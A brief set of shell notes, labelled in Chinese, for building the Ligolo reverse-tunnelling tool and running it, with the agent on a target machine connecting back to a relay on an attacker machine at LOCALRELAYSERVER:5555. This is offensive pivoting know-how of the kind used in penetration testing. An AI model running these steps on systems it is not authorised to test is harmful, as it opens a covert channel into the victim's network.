	>cd `go env GOPATH`/src
	>git clone https://github.com/sysdream/ligolo
	>cd ligolo
	>make dep
	生成证书
	>make certs TLS_HOST=example.com

	>make build-all

	靶机执行
	>ligolo_windows_amd64.exe -relayserver LOCALRELAYSERVER:5555
	攻击机执行
	>./bin/localrelay_linux_amd64